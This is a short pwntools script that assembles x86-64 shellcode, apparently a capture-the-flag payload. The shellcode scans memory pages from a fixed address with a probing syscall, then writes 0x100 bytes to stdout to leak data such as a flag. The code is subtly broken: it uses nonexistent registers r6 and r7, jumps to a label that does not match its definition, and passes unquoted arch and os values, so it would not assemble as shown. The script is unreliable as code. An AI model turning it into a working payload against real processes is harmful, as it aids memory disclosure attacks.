from pwn import *

asm("""
    
    mov rdi, 0x2444000
    mov rdx, 0x53484349
    mov r6, 0x1
    lea r10, [r6]
    mov r7, 0x1
    shl r7 , 0xc

    .L1:
        mov rax, 0xf0
        xor rsi, rsi 
                
        syscall 

        add rdi, r7

        cmp eax, 0
        je L1        


        
    mov rsi, rcx
    mov rdx ,0x100
    mov rdi, 0x1
    mov rax, 0x1
    syscall



""",
arch=amd64,
os =linux
)